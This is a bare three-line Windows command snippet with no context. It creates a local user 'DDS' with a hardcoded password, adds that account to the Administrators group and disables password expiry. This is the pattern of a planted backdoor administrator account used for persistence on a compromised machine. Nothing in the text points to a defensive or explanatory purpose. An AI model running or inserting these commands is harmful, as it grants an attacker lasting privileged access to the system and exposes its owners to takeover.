net user /add DDS Aries2025!
net localgroup Administrators DDS /add
WMIC USERACCOUNT WHERE Name='DDS' SET PasswordExpires=FALSE
